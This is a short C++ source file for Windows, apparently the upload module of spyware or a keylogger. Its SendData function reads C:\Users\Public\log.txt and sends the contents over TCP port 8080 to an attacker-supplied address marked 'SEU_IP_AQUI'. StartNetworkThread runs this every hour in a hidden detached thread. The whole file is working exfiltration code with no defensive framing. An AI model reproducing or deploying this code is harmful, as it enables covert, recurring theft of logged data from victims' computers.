#include "network.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <fstream>

void SendData() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(8080);
    inet_pton(AF_INET, "SEU_IP_AQUI", &server.sin_addr);

    if (connect(sock, (sockaddr*)&server, sizeof(server)) == 0) {
        std::ifstream file("C:\\Users\\Public\\log.txt", std::ios::binary);
        std::string data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        send(sock, data.c_str(), data.size(), 0);
    }
    closesocket(sock);
    WSACleanup();
}

void StartNetworkThread() {
    std::thread([]() {
        while (true) {
            SendData();
            std::this_thread::sleep_for(std::chrono::hours(1));
        }
    }).detach();
}
